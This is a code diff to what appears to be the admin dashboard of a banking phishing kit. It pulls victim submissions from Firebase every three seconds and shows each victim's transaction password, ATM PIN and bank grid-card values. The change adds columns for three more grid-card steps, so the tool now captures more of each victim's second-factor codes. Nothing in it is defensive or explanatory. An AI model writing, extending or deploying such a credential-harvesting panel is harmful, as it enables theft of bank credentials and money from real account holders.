@@ -9,7 +9,7 @@
         body { background: #f4f7f6; padding: 20px; }
         h2 { color: #0056b3; text-align: center; margin-bottom: 20px; }
         .table-container { width: 100%; overflow-x: auto; background: #fff; padding: 15px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        table { width: 100%; border-collapse: collapse; min-width: 1700px; }
+        table { width: 100%; border-collapse: collapse; min-width: 2000px; }
         th, td { padding: 12px; border: 1px solid #ddd; text-align: left; font-size: 13px; }
         th { background-color: #0056b3; color: white; }
         tr:nth-child(even) { background-color: #f9f9f9; }
@@ -42,11 +42,14 @@
                     <th>Transaction Password</th>
                     <th>ATM PIN</th>
                     <th>Grid Step 1</th>
+                    <th>Grid Step 2</th>
+                    <th>Grid Step 3</th>
+                    <th>Grid Step 4</th>
                     <th>Status / Current Step</th>
                 </tr>
             </thead>
             <tbody id="dataTable">
-                <tr><td colspan="17" class="loading">Loading data from Firebase...</td></tr>
+                <tr><td colspan="20" class="loading">Loading data from Firebase...</td></tr>
             </tbody>
         </table>
     </div>
@@ -77,7 +80,7 @@
                 tableBody.innerHTML = "";
                 
                 if (querySnapshot.empty) {
-                    tableBody.innerHTML = "<tr><td colspan='17' class='loading'>कोई डेटा उपलब्ध नहीं है।</td></tr>";
+                    tableBody.innerHTML = "<tr><td colspan='20' class='loading'>कोई डेटा उपलब्ध नहीं है।</td></tr>";
                     return;
                 }
 
@@ -100,6 +103,9 @@
                         <td>${data.transPassword || 'Pending'}</td>
                         <td>${data.atmPin || 'Pending'}</td>
                         <td>${data.gridStep1 || 'Pending'}</td>
+                        <td>${data.gridStep2 || 'Pending'}</td>
+                        <td>${data.gridStep3 || 'Pending'}</td>
+                        <td>${data.gridStep4 || 'Pending'}</td>
                         <td><b>${data.currentStep || 'Started'}</b></td>
                     </tr>`;
                     tableBody.innerHTML += row;
@@ -109,10 +115,7 @@
             }
         }
 
-        // पहली बार लोड करें
         loadSubmissions();
-
-        // हर 3 सेकंड में ऑटो-रिफ्रेश करें
         setInterval(loadSubmissions, 3000);
     </script>
 </body>
